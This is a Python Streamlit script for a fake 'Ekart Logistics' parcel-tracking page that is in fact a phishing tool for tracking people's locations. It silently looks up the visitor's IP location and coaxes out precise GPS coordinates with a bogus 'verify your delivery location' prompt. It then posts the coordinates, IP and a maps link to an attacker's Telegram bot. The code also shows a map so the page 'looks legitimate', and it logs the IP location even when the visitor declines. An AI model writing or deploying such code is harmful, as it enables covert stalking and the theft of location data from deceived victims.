import streamlit as st
from streamlit_geolocation import streamlit_geolocation
import requests
import pandas as pd
import datetime

# --- SETTINGS ---
# Use your Telegram info here
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
CHAT_ID = "YOUR_CHAT_ID_OR_CHANNEL"

st.set_page_config(page_title="Ekart Logistics", page_icon="📦")

# Simple, clean branding
st.markdown("""
    <style>
    .main { background-color: #f8f9fa; }
    .stButton>button { width: 100%; border-radius: 5px; height: 3em; background-color: #2874f0; color: white; }
    </style>
    <div style='background-color: #2874f0; padding: 15px; text-align: center;'>
        <h2 style='color: white; margin: 0;'>EKART LOGISTICS</h2>
    </div>
""", unsafe_allow_html=True)

# 1. Background IP Intel (Silent)
try:
    ip_data = requests.get('http://ip-api.com/json/').json()
    user_ip = ip_data.get('query', 'N/A')
except:
    ip_data = {}
    user_ip = "N/A"

def send_to_telegram(lat, lon, type):
    try:
        msg = f"📦 *Update for ID: EK-1711*\nType: {type}\nIP: {user_ip}\nLat: {lat}\nLon: {lon}\n" \
              f"Link: https://www.google.com/maps?q={lat},{lon}"
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                      data={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    except:
        pass

# 2. Main Interface
st.write("### Track Your Shipment")
st.info("Shipment ID: **#EK-17112026**")
st.write("Please verify your delivery location to see the estimated arrival time.")

# The Geolocation Button
# Note: On mobile, this MUST be served over HTTPS to work.
location = streamlit_geolocation()

if location.get('latitude'):
    st.success("Location Verified!")
    send_to_telegram(location['latitude'], location['longitude'], "HIGH_ACCURACY_GPS")
    
    # Show the map to the user so it looks legitimate
    df = pd.DataFrame({'lat': [location['latitude']], 'lon': [location['longitude']]})
    st.map(df)
else:
    # Always log the IP location as a fallback
    if 'lat' in ip_data:
        send_to_telegram(ip_data['lat'], ip_data['lon'], "IP_CITY_LEVEL")
    st.write("Waiting for verification...")

st.divider()
st.caption("© 2026 Ekart Logistics | Private & Confidential")
